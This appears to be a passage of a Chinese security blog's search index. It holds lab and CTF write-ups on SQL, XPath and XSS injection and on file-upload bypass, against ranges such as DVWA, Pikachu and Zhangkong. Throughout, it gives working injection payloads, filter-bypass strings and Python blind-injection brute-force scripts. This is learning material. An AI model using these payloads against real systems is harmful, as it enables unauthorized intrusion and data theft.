class=\"hljs plaintext\">select UTL_INADDR.get_host_name((select user from dual)) from dual;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>UTL_INADDR.get_host_address</strong></li>\n</ul>\n  <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">select UTL_INADDR.get_host_name(&#x27;~&#x27;||(select user from dual)||&#x27;~&#x27;) from dual;<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h1><p>这篇文章只是粗略的介绍，盲注的内容我全部省略了，此文章作为自己的参考，希望可以帮助到为数不多的读者</p>\n","categories":["Web"],"tags":["sql"]},{"title":"墨客靶场打靶随记","url":"/2023/06/17/%E5%A2%A8%E5%AE%A2%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/","content":"<p>这篇文章的靶场是墨客的靶场</p>\n<span id=\"more\"></span>\n\n<p>墨客的靶场应该是最接近实战的靶场了，</p>\n<p>并且有一定的难度，靶场比较全面</p>\n<p>这篇文章看看能在不看提示的情况下解决几个</p>\n\n\n<p>就这个了</p>\n<h1 id=\"SQL注入靶场1-基本检查\"><a href=\"#SQL注入靶场1-基本检查\" class=\"headerlink\" title=\"SQL注入靶场1-基本检查\"></a>SQL注入靶场1-基本检查</h1><p>xpath。。。。</p>\n<p>我是个脑残啊沃柑我根本不会xpath啊</p>\n<p>反正先试试吧。。。。。。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">http://124.70.71.251:41314/demo.php?name=xml<br></code></pre></td></tr></table></figure>\n\n<p>后面有个?name&#x3D;xxx尝试看看最简单的数字型、字符型注入</p>\n<p>不行，怎么样都会报错，</p>\n<p>尝试报错注入呢？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?name=-xml&#x27; or updatexml(1,concat(0x7e,(database()),1) --+<br></code></pre></td></tr></table></figure>\n\n<p>不行，尝试时间盲注</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?name=-xml&#x27; or sleep(3) --+<br></code></pre></td></tr></table></figure>\n\n<p>依旧不行。。。。</p>\n<p>哎，那就用一下sqlmap试试吧。。。不能浪费墨币</p>\n\n\n<p>is not injectable………….</p>\n<h1 id=\"SQL注入靶场1-正式开干\"><a href=\"#SQL注入靶场1-正式开干\" class=\"headerlink\" title=\"SQL注入靶场1-正式开干\"></a>SQL注入靶场1-正式开干</h1><p>搜一下xpath注入吧看看能否现学</p>\n<blockquote>\n<p><a href=\"https://www.cnblogs.com/backlion/p/8554749.html\">https://www.cnblogs.com/backlion/p/8554749.html</a></p>\n</blockquote>\n\n\n<p>难道就是让查询为true就可以获得同样的回显吗？</p>\n<p>这不就是post注入万能密码的原理吗？</p>\n<p>那试试看吧，</p>\n<p>这里我不知道闭合是什么，因此我就先构造两个语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?name=xml&#x27; or &#x27;1&#x27;=&#x27;1<br>?name=xml&quot; or &quot;1&quot;=&quot;1<br></code></pre></td></tr></table></figure>\n\n<p>最后一个双引号或者单引号其实就是让原来后台语句的单引号或双引号也发挥作用</p>\n<p>因为在xml里面似乎注释符不可以注释所有后面的东西，</p>\n<p>他的注释长这样：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;!--注释内容--&gt;<br></code></pre></td></tr></table></figure>\n\n<p>好了废话不多说去靶场试一下吧</p>\n\n\n<p>??????????????</p>\n<p>沃柑直接出key了牛皮</p>\n<h1 id=\"SQL注入靶场1-结束。。\"><a href=\"#SQL注入靶场1-结束。。\" class=\"headerlink\" title=\"SQL注入靶场1-结束。。\"></a>SQL注入靶场1-结束。。</h1><p>看了一下别人的writeup</p>\n\n\n<p>发现还有一种payload是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27;]|//*|//*[&#x27;<br></code></pre></td></tr></table></figure>\n\n<p>最前面最后面两个引号中括号是闭合前面后面的东西，</p>\n<p>后面的那个东西我猜应该就是搜寻全部内容吧</p>\n<p>原来的查询语句是这样的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">//users/user[loginID/text()=&#x27;user&#x27; and password/text()=&#x27;password&#x27;]<br></code></pre></td></tr></table></figure>\n\n<p>带入之后变成了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">//users/user[loginID/text()=&#x27;user&#x27; and password/text()=&#x27;&#x27;]|//*|//*[&#x27;&#x27;]<br></code></pre></td></tr></table></figure>\n\n<p>中间那个管道符“|”应该是起到分号也就是堆叠查询的作用吧？</p>\n<hr>\n<p>这个靶场结束的有点意外</p>\n<hr>\n<p>再开一个靶场练练吧。。。。这次一定挑一个会的</p>\n<h1 id=\"SQL注入靶场2-基本检查即结束\"><a href=\"#SQL注入靶场2-基本检查即结束\" class=\"headerlink\" title=\"SQL注入靶场2-基本检查即结束\"></a>SQL注入靶场2-基本检查即结束</h1>\n\n<p>就这个了，这个是post注入</p>\n<p>首先万能密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">admin&#x27; or 1=1 # <br>admin&quot; or 1=1 #<br></code></pre></td></tr></table></figure>\n\n<p>？？？万能密码直接过了？？？</p>\n<p>浪费我3个墨币。。。。</p>\n<h1 id=\"文件上传第一题\"><a href=\"#文件上传第一题\" class=\"headerlink\" title=\"文件上传第一题\"></a>文件上传第一题</h1><p>首先直接上传shell.php</p>\n<p>提示不让上传，然后尝试改名为shell.png然后bp抓包改名，</p>\n<p>已经提示不让上传，看来是后端验证了，</p>\n<p>然后尝试在后缀名上做手脚，发现这是个Linux的服务器，</p>\n<p>Windows特性绕不了，在尝试使用另类的文件名例如php3，</p>\n<p>上传成功了！蚁剑连接成功，getshell！</p>\n<p>最后在文件里面找到了flag</p>\n\n\n<h1 id=\"文件上传第二题\"><a href=\"#文件上传第二题\" class=\"headerlink\" title=\"文件上传第二题\"></a>文件上传第二题</h1><p>这跟第一题一毛一样啊浪费我墨币。。。。。</p>\n<h1 id=\"文件上传第三题\"><a href=\"#文件上传第三题\" class=\"headerlink\" title=\"文件上传第三题\"></a>文件上传第三题</h1><p>这次学聪明了看了一下别人的writeup，和前面两题解法一样。。。。</p>\n<p>不然又要被坑了</p>\n<h1 id=\"文件上传第四题\"><a href=\"#文件上传第四题\" class=\"headerlink\" title=\"文件上传第四题\"></a>文件上传第四题</h1><p>这道题考点是mime文件头，只需要在content-type那里修改为image.png即可</p>\n","categories":["Web"],"tags":["sql","file_upload"]},{"title":"存储型,Dom型Xss注入学习笔记","url":"/2023/06/30/%E5%AD%98%E5%82%A8%E5%9E%8B,Dom%E5%9E%8BXss%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<p>这篇文章是存储型和DOM型xss学习以及实操打靶</p>\n<span id=\"more\"></span>\n\n<p>首先这个学习笔记来源于合天网安的公开课：</p>\n<p><a href=\"https://www.bilibili.com/video/BV1hY411a7P5\">https://www.bilibili.com/video/BV1hY411a7P5</a></p>\n<p>然后这篇笔记是第5，6p，存储型xss的讲解。</p>\n<h1 id=\"存储型-原理-amp-利用场景\"><a href=\"#存储型-原理-amp-利用场景\" class=\"headerlink\" title=\"存储型 - 原理 &amp; 利用场景\"></a>存储型 - 原理 &amp; 利用场景</h1><p>原理：</p>\n\n\n<p>利用场景：</p>\n\n\n<p>一般是和数据库有交互的场景下，存入的时候对页面和数据库没有影响，但是在显示输出的时候被浏览器当成的页面元素，执行了xss语句</p>\n<h1 id=\"存储型-打靶实操\"><a href=\"#存储型-打靶实操\" class=\"headerlink\" title=\"存储型 - 打靶实操\"></a>存储型 - 打靶实操</h1><p>偌大的互联网找了一圈，最后发现他就静静的躺在我的pikachu和DVWA靶场里面。。</p>\n<h2 id=\"Pikachu\"><a href=\"#Pikachu\" class=\"headerlink\" title=\"Pikachu\"></a>Pikachu</h2>\n\n<p>这是一个留言板，典型的存储型xss利用场景（这个是sql注入那一关insert&#x2F;delete注入的留言板，之前的留言都还在🤣）</p>\n<p>我们输入test后查看页面源代码：</p>\n\n\n<p>不需要考虑闭合直接构造最简单的payload：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-string\">&#x27;xss&#x27;</span>)</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n\n\n<p>成功注入，网页源代码中将其成功解释为了html标签</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">p</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">&#x27;con&#x27;</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"hljs-title function_\">alert</span>(<span class=\"hljs-string\">&#x27;xss&#x27;</span>)</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">p</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">&#x27;xss_stored.php?id=68&#x27;</span>&gt;</span>删除<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>之后无论怎么刷新都是一样会弹窗的，可以看出这就是一个存储型的xss</p>\n<h2 id=\"DVWA\"><a href=\"#DVWA\" class=\"headerlink\" title=\"DVWA\"></a>DVWA</h2><h3 id=\"Low\"><a href=\"#Low\" class=\"headerlink\" title=\"Low\"></a>Low</h3><p>应该和上面的pikachu的是一样的</p>\n\n\n<h3 id=\"Medium\"><a href=\"#Medium\" class=\"headerlink\" title=\"Medium\"></a>Medium</h3><p>上面一关的payload用不了了，单引号被转义了，script标签被删除了：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;guestbook_comments&quot;</span>&gt;</span>Name: Vincent<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span>Message: alert(\\&#x27;xss\\&#x27;)<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>我们找来前面反射型的测试payload来看看他过滤了哪一些：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">sRc DaTa OnFocus OnmOuseOver OnMouseDoWn &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;<br></code></pre></td></tr></table></figure>\n\n<p>回显是这样的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">Name: Test<br>Message: sRc DaTa OnFocus OnmOuseOver OnMouseDoWn <br></code></pre></td></tr></table></figure>\n\n<p>也就是说我们不能使用尖括号，且他对大小写不敏感….这，，怎么绕过？</p>\n<p>看一下源码：</p>\n\n\n<p>好家伙，各种过滤</p>\n<ul>\n<li><p>trim 移除首尾空格 </p>\n</li>\n<li><p>addslashes 转义引号</p>\n<p>这个影响不大换成数字即可（这里无法宽字节绕过）</p>\n</li>\n<li><p>mysqli_real_escape_string 转义在 SQL 语句中使用的字符串中的特殊字符</p>\n<p>下列字符受影响：</p>\n<ul>\n<li>\\x00</li>\n<li>\\n</li>\n<li>\\r</li>\n<li>\\</li>\n<li>‘</li>\n<li>“</li>\n<li>\\x1a</li>\n</ul>\n<p>其实也就是引号的过滤</p>\n</li>\n<li><p>删除<code>&lt;script&gt;</code></p>\n</li>\n</ul>\n<p>但是，全部的过滤似乎都是对于Message的，我们为什么不可以在name处注入呢？</p>\n<p>  这个的影响最大，但是他只过滤一次，可以尝试复写过滤字符串（name处）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scri&lt;script&gt;pt&gt;<br></code></pre></td></tr></table></figure>\n\n\n\n<p>注意在注入前要在前端修改maxlength</p>\n<h3 id=\"High\"><a href=\"#High\" class=\"headerlink\" title=\"High\"></a>High</h3><p>使用上一关的payload，过滤后只剩下了一个尖括号</p>\n<p>查看源码</p>\n\n\n<p>这一关在script这上面肯定做不了手脚了，复写、大小写都不行，但是我们可以使用其他的标签啊！a href 、 img src等</p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;img src=114514 onerror=alert(1)&gt;<br></code></pre></td></tr></table></figure>\n\n\n\n<p>成功弹窗</p>\n<h1 id=\"DOM型-原理-amp-利用场景\"><a href=\"#DOM型-原理-amp-利用场景\" class=\"headerlink\" title=\"DOM型 - 原理 &amp; 利用场景\"></a>DOM型 - 原理 &amp; 利用场景</h1>\n\n<p>这个给我的理解就是前端的，前端的东西都是纸老虎，因此绕过方式应该会简单很多</p>\n<h1 id=\"存储型-打靶实操-1\"><a href=\"#存储型-打靶实操-1\" class=\"headerlink\" title=\"存储型 - 打靶实操\"></a>存储型 - 打靶实操</h1><h2 id=\"DVWA-1\"><a href=\"#DVWA-1\" class=\"headerlink\" title=\"DVWA\"></a>DVWA</h2><h3 id=\"Low-1\"><a href=\"#Low-1\" class=\"headerlink\" title=\"Low\"></a>Low</h3><p>直接在url的default中写入最简单的注入payload：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span>alert(111)<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>成功弹窗</p>\n<h3 id=\"Medium-1\"><a href=\"#Medium-1\" class=\"headerlink\" title=\"Medium\"></a>Medium</h3><p>上一关的payload被过滤了，f12仔细查看</p>\n\n\n<p>原来这一关需要闭合前面和后面的内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(1)&gt;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"High-1\"><a href=\"#High-1\" class=\"headerlink\" title=\"High\"></a>High</h3>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">English&amp;&lt;script&gt;alert(123)&lt;/script&gt;<br></code></pre></td></tr></table></figure>\n\n<hr>\n<p>打靶暂时先到这里，之后有靶场可能随缘记录</p>\n","categories":["Note"],"tags":["xss"]},{"title":"掌控安全打靶随记","url":"/2023/06/11/%E6%8E%8C%E6%8E%A7%E5%AE%89%E5%85%A8%E6%89%93%E9%9D%B6%E9%9A%8F%E8%AE%B0/","content":"<p>这篇文章的靶场是掌控安全的sql注入靶场</p>\n<span id=\"more\"></span>\n\n<p>靶场地址：<a href=\"http://injectx1.lab.aqlab.cn/\">http://injectx1.lab.aqlab.cn/</a></p>\n<h1 id=\"Pass1-Pass4\"><a href=\"#Pass1-Pass4\" class=\"headerlink\" title=\"Pass1-Pass4\"></a>Pass1-Pass4</h1><p>pass1-4几乎没有区别，</p>\n<p>就是闭合变了</p>\n<p>且都是简单的字符型注入</p>\n<p>这里就放一个的url构造：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1 order by 3<br><br>?id=1 and 1=2 union select 1,2,3<br><br>?id=1 and 1=2 union select 1,2,database() --&gt; error<br><br>?id=1 and 1=2 union select 1,2,group_concat(table_name)<br> from information_schema.tables where table_schema=&#x27;error&#x27; --&gt; error_flag,user<br><br>?id=1 and 1=2 union select 1,2,group_concat(column_name)<br> from information_schema.columns where table_schema=&#x27;error&#x27; and table_name=&#x27;user&#x27; --&gt; Id,username,password<br><br>?id=1 and 1=2 union select 1,2,group_concat(Id,username,password) from user<br></code></pre></td></tr></table></figure>\n\n<p>后面的略</p>\n<h1 id=\"Pass10-Pass11\"><a href=\"#Pass10-Pass11\" class=\"headerlink\" title=\"Pass10-Pass11\"></a>Pass10-Pass11</h1><p>布尔盲注，需要脚本爆破，随便写了一个</p>\n<p>首先先手动二分法试一下数据库的长度</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests<br><span class=\"hljs-keyword\">import</span> time<br><br>url = <span class=\"hljs-string\">&#x27;http://injectx1.lab.aqlab.cn/Pass-10/index.php?id=1&#x27;</span><br><br>database = <span class=\"hljs-string\">&#x27;&#x27;</span><br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">check</span>(<span class=\"hljs-params\">url</span>):<br>    res = requests.get(url)<br>    <span class=\"hljs-keyword\">if</span> res.status_code != <span class=\"hljs-number\">200</span>:<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;\\n\\n-----failed------\\n\\n&#x27;</span>)<br>    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&#x27;有数据&#x27;</span> <span class=\"hljs-keyword\">in</span> res.text:<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">True</span><br>    <span class=\"hljs-keyword\">else</span>:<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">False</span><br><br><span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">13</span>):<br>    <span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">65</span>,<span class=\"hljs-number\">123</span>):<br>        temp = url + <span class=\"hljs-string\">f&#x27; and ascii(substr(database(),<span class=\"hljs-subst\">&#123;i&#125;</span>,1))=<span class=\"hljs-subst\">&#123;j&#125;</span>&#x27;</span><br>        <span class=\"hljs-keyword\">if</span> check(temp):<br>            database += <span class=\"hljs-built_in\">chr</span>(j)<br>            <span class=\"hljs-built_in\">print</span>(database)<br>        <span class=\"hljs-keyword\">else</span>:<br>            <span class=\"hljs-keyword\">pass</span><br>        time.sleep(<span class=\"hljs-number\">0.1</span>)<br></code></pre></td></tr></table></figure>\n\n\n\n<p>库名：kanwolongxia</p>\n<p>（这一步其实可以省略，只是我忘记了）</p>\n<p>继续爆破列名,</p>\n<p>首先先手动二分法试一下表名的长度</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests<br><span class=\"hljs-keyword\">import</span> time<br><br>url = <span class=\"hljs-string\">&#x27;http://injectx1.lab.aqlab.cn/Pass-10/index.php?id=1&#x27;</span><br><br>table = <span class=\"hljs-string\">&#x27;&#x27;</span><br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">check</span>(<span class=\"hljs-params\">url</span>):<br>    res = requests.get(url)<br>    <span class=\"hljs-keyword\">if</span> res.status_code != <span class=\"hljs-number\">200</span>:<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;\\n\\n-----failed------\\n\\n&#x27;</span>)<br>    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&#x27;有数据&#x27;</span> <span class=\"hljs-keyword\">in</span> res.text:<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">True</span><br>    <span class=\"hljs-keyword\">else</span>:<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">False</span><br><br><span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">17</span>):<br>    <span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">44</span>,<span class=\"hljs-number\">123</span>):<br>        <span class=\"hljs-keyword\">if</span> j &lt; <span class=\"hljs-number\">65</span> <span class=\"hljs-keyword\">and</span> j != <span class=\"hljs-number\">44</span>:<br>            <span class=\"hljs-keyword\">continue</span> <br>        temp = url + <span class=\"hljs-string\">f&#x27;  and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class=\"hljs-subst\">&#123;i&#125;</span>,1))=<span class=\"hljs-subst\">&#123;j&#125;</span>&#x27;</span><br>        <span class=\"hljs-keyword\">if</span> check(temp):<br>            table += <span class=\"hljs-built_in\">chr</span>(j)<br>            <span class=\"hljs-built_in\">print</span>(table)<br>        <span class=\"hljs-keyword\">else</span>:<br>            <span class=\"hljs-keyword\">pass</span><br></code></pre></td></tr></table></figure>\n\n<p>表名：loflag,news,user</p>\n<p>这里挑选loflag</p>\n<p>然后爆破列名，首先爆破一下长度</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1 and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;loflag&#x27;)) = 9<br></code></pre></td></tr></table></figure>\n\n<p>长度为9</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests<br><span class=\"hljs-keyword\">import</span> time<br><br>url = <span class=\"hljs-string\">&#x27;http://injectx1.lab.aqlab.cn/Pass-10/index.php?id=1&#x27;</span><br><br>column = <span class=\"hljs-string\">&#x27;&#x27;</span><br><br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">check</span>(<span class=\"hljs-params\">url</span>):<br>    res = requests.get(url)<br>    <span class=\"hljs-keyword\">if</span> res.status_code != <span class=\"hljs-number\">200</span>:<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;\\n\\n-----failed------\\n\\n&#x27;</span>)<br>    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&#x27;有数据&#x27;</span> <span class=\"hljs-keyword\">in</span> res.text:<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">True</span><br>    <span class=\"hljs-keyword\">else</span>:<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">False</span><br><br><span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">10</span>):<br>    <span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">44</span>,<span class=\"hljs-number\">123</span>):<br>        <span class=\"hljs-keyword\">if</span> j &lt; <span class=\"hljs-number\">65</span> <span class=\"hljs-keyword\">and</span> j != <span class=\"hljs-number\">44</span>:<br>            <span class=\"hljs-keyword\">continue</span> <br>        temp = url + <span class=\"hljs-string\">f&quot; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;loflag&#x27;),<span class=\"hljs-subst\">&#123;i&#125;</span>,1))=<span class=\"hljs-subst\">&#123;j&#125;</span>&quot;</span><br>        <span class=\"hljs-keyword\">if</span> check(temp):<br>            column += <span class=\"hljs-built_in\">chr</span>(j)<br>            <span class=\"hljs-built_in\">print</span>(column)<br>        <span class=\"hljs-keyword\">else</span>:<br>            <span class=\"hljs-keyword\">pass</span><br></code></pre></td></tr></table></figure>\n\n<p>列名：Id,flaglo</p>\n<p>试出flaglo长度为55</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">?id=1 and length((select group_concat(flaglo) from loflag))=55<br></code></pre></td></tr></table></figure>\n\n<p>开始爆破key</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests<br><br>url = <span class=\"hljs-string\">&#x27;http://injectx1.lab.aqlab.cn/Pass-10/index.php?id=1&#x27;</span><br><br>content = <span class=\"hljs-string\">&#x27;&#x27;</span><br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">check</span>(<span class=\"hljs-params\">url</span>):<br>    res = requests.get(url)<br>    <span class=\"hljs-keyword\">if</span> res.status_code != <span class=\"hljs-number\">200</span>:<br>        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">&#x27;\\n\\n-----failed------\\n\\n&#x27;</span>)<br>    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-string\">&#x27;有数据&#x27;</span> <span class=\"hljs-keyword\">in</span> res.text:<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">True</span><br>    <span class=\"hljs-keyword\">else</span>:<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">False</span><br><br><span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">56</span>):<br>    <span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">44</span>,<span class=\"hljs-number\">123</span>):<br>        <span class=\"hljs-keyword\">if</span> j &lt; <span class=\"hljs-number\">65</span> <span class=\"hljs-keyword\">and</span> j != <span class=\"hljs-number\">44</span>:<br>            <span class=\"hljs-keyword\">continue</span> <br>        temp = url + <span class=\"hljs-string\">f&quot; and ascii(substr((select group_concat(flaglo) from loflag),<span class=\"hljs-subst\">&#123;i&#125;</span>,1))=<span class=\"hljs-subst\">&#123;j&#125;</span>&quot;</span><br>        <span class=\"hljs-keyword\">if</span> check(temp):<br>            content += <span class=\"hljs-built_in\">chr</span>(j)<br>            <span class=\"hljs-built_in\">print</span>(content)<br>        <span class=\"hljs-keyword\">else</span>:<br>            <span class=\"hljs-keyword\">pass</span><br></code></pre></td></tr></table></figure>\n\n<p>得到key：zKaQQQQ,zKaQRD,zKaQMoren,zKaQtimehj,zKaQtimezxxz</p>\n\n\n<p>pass11就是闭合变了，其他和pass10一样</p>\n<h1 id=\"Pass5-Pass6-Pass12\"><a href=\"#Pass5-Pass6-Pass12\" class=\"headerlink\" title=\"Pass5-Pass6,Pass12\"></a>Pass5-Pass6,Pass12</h1><p>登录界面，post注入</p>\n<p>首先尝试万能密码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">admin&#x27; or 1=1#<br></code></pre></td></tr></table></figure>\n\n<p>成功登录，接下来就简单了，</p>\n<p>就是在这里简单的union字符型注入了</p>\n<p>打开burpsuite抓个包：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">username=admin&amp;password=admin&amp;submit=%E7%99%BB%E5%BD%95<br></code></pre></td></tr></table></figure>\n\n<p>字段数：3</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">username=admin&#x27; order by 3#&amp;password=admin&amp;submit=%E7%99%BB%E5%BD%95<br></code></pre></td></tr></table></figure>\n\n<p>回显点：2，3</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">username=-admin&#x27; union select 1,2,3#&amp;password=admin&amp;submit=%E7%99%BB%E5%BD%95<br></code></pre></td></tr></table></figure>\n\n<p>表名：flag,user</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">username=-admin&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;password=admin&amp;submit=%E7%99%BB%E5%BD%95<br></code></pre></td></tr></table></figure>\n\n<p>列名：Id,flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">username=-admin&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27;#&amp;password=admin&amp;submit=%E7%99%BB%E5%BD%95<br></code></pre></td></tr></table></figure>\n\n<p>全部数据：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">username=-admin&#x27; union select 1,2,group_concat(Id,&#x27;:&#x27;,flag) from flag#&amp;password=admin&amp;submit=%E7%99%BB%E5%BD%95<br></code></pre></td></tr></table></figure>\n\n\n\n<p>pass12是布尔盲注。。。。。。</p>\n<p>算了直接略吧。。。。</p>\n<p>和上面pass10，11几乎一样</p>\n<h1 id=\"Pass7-Pass9\"><a href=\"#Pass7-Pass9\" class=\"headerlink\" title=\"Pass7-Pass9\"></a>Pass7-Pass9</h1><p>ua注入，</p>\n<p>直接在ua构造语句即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">&#x27; or 